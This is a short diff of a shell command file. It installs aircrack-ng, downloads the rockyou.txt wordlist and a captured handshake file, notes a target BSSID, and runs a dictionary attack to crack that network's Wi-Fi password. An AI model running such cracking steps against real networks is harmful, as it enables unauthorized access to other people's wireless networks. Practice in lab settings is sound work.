@@ -1,13 +1,9 @@
+BSSID: a0:9b:17:8e:fb:09
+
 apt-get update
-apt-get install aircrack-ng
-
-
-
+apt-get -y install aircrack-ng
 
 wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 wget https://github.com/InSandBox/play/raw/main/ok.cap
-
-BSSID: a0:9b:17:8e:fb:09
-
 
 aircrack-ng -w rockyou.txt -b a0:9b:17:8e:fb:09 ok.cap
